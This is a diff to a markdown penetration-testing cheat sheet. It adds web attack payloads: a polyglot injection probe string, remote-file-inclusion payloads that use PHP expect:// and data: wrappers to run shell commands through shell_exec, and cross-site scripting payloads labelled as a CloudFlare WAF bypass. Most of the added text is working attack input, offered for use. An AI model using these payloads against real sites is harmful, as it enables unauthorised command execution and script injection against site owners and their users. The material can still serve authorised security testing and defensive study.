@@ -189,6 +189,12 @@ assetfinder <target> | gau | egrep -v '(.css|.png|.jpeg|.jpg|.svg|.gif|.wolf)' |
 
 ## **Common attacks**
 
+### All Injections 
+
+```bash
+)‘“'"`<u>testocd${7*6}{{7*5}} 
+```
+
 ### LFI
 
 Local file inclusion fuzzing
@@ -209,8 +215,13 @@ Getting shell from RFI
 - PHP Expect
 
 ```bash
-<target>?page=expect://id
-<target>?page=expect://ls
+<target>?page=expect://whoami
+```
+
+- PHP data
+- 
+```bash
+<target>?=data:text/plain,<?php echo shell_exec("whoami") ?>
 ```
 
 - PHP Input 
@@ -405,6 +416,11 @@ Cross-Site Scripting
 test+(<script>prompt(1000)</script>)@example.com
 test@example(<script>prompt(1000)</script>).com
 "<script>alert(1000)</script>"@example.com
+
+# CloudFlare bypass
+<svg onload=alert%26%230000000040"1")>
+<svg onload=prompt%26%230000000040document.domain)>
+<svg onload=prompt%26%23x000000028;document.domain)>
 ```
 
 
